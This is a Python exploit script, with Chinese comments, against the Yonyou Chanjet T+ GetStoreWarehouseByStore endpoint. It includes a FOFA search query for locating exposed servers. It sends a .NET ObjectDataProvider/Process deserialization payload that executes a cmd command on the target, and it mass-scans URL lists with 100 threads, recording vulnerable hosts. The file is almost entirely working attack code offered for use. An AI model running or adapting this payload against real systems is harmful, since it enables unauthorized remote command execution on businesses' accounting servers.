#用友畅捷通T+ GetStoreWarehouseByStore 远程命令执行漏洞 
#fofa:app="畅捷通-TPlus"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

████████╗██████╗ ██╗     ██╗   ██╗███████╗
╚══██╔══╝██╔══██╗██║     ██║   ██║██╔════╝
   ██║   ██████╔╝██║     ██║   ██║███████╗
   ██║   ██╔═══╝ ██║     ██║   ██║╚════██║
   ██║   ██║     ███████╗╚██████╔╝███████║
   ╚═╝   ╚═╝     ╚══════╝ ╚═════╝ ╚══════╝                                                                                                                                                                                                                              
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="用友畅捷通T+ GetStoreWarehouseByStore远程命令执行漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/112.0.0.0Safari/537.36',
        'X-Ajaxpro-Method':'GetStoreWarehouseByStore',
        'Accept':'text/html,image/gif,image/jpeg,*;q=.2,*/*;q=.2',
        'Connection':'close',
        'Content-type':'application/x-www-form-urlencoded',
        'Content-Length':'577',
        
    }
    data = {
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c whoami > test.txt"
        }
    }
  }
}
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,json=data,verify=False,proxies=proxies)
        if res1.status_code==200 and 'message' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()